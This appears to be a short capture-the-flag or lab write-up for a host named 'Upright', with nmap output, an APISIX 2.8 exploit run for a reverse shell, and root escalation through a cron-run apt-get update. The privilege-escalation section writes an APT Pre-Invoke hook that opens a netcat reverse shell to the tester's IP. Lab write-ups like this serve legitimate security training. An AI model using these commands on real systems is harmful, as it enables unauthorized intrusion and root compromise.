# Table of Contents
- [Recon](#recon)
    - [nmap](#nmap)
- [Foothold](#foothold)
    - [Ports](#ports)
- [PE](#pe)

# Recon

## nmap
```c
PORT STATE SERVICE REASON

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)  
| 256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)  
|_ 256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)  
80/tcp open http nginx 1.18.0 (Ubuntu)  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
|_http-title: Upright  
3306/tcp open mysql MySQL (unauthorized)  
8080/tcp closed http-proxy  
43500/tcp open http OpenResty web app server  
|_http-server-header: APISIX/2.8  
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).  
Device type: general purpose|storage-misc|firewall  
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (85%), Synology DiskStation Manager 5.X (85%), WatchGuard Fireware 11.X (85%)  
OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/o:watchguard:fireware:11.8  
Aggressive OS guesses: Linux 2.6.32 (85%), Linux 2.6.32 or 3.10 (85%), Linux 2.6.39 (85%), Linux 3.10 - 3.12 (85%), Linux 3.4 (85%), Linux 4.4 (85%), Synology DiskStation Manager 5.1 (85%), WatchGuard Fireware 11.8 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 4 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Foothold
## Ports
#### 80
<pre>
- Ran ffuf to find directories
    - /img
    - /js
    - /css
    - /slick
        403 forbidden
- Searchsploit APISIX/2.8
    - https://www.exploit-db.com/exploits/50829
    - nc -lvnp 1234
    - python 50829 http://192.168.218.220:43500/ 192.168.45.151 1234
</pre>
# PE
<pre>
- Upgrade shell
    - python3 -c 'import pty; pty.spawn("/bin/bash")'
- id
    - uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
- cat cron/tab
 - root apt-get update
    - cd /etc/apt/apt.conf.d/
    - https://systemweakness.com/code-execution-with-apt-update-in-crontab-privesc-in-linux-e6d6ffa8d076
    - echo '#!/bin/bash' > priv
    - echo 'APT::Update::Pre-Invoke {"nc -c /bin/bash 192.168.45.151 80"}' >> priv
    - nc -lvnp 80  >  rooted
</pre>